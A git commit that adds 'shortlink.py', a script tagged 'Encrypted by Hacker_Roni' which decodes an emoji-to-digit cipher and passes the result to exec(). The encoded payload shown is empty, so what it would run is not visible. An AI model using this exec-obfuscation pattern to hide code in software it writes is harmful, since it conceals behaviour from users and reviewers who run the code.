49ade3f6b9f38f395f3c5b7f57efa07247eccb56
MD Roni Mia <contactronibd@gmail.com>
2024-07-18 11:05:32 +0600

    Add files via upload

---
+++ shortlink.py
@@ -0,0 +1,6 @@
+# Encrypted by Hacker_Roni
+# Github- https://github.com/ronibd67
+
+exec("".join(map(chr,[int("".join(str({'😀': 0, '😁': 3, '😂': 6, '😃': 1, '😄': 2, '😅': 4, '😉': 7, '😊': 8, '😛': 9, '🤣': 5}[i]) for i in x.split())) for x in
+""
+.split("  ")])))
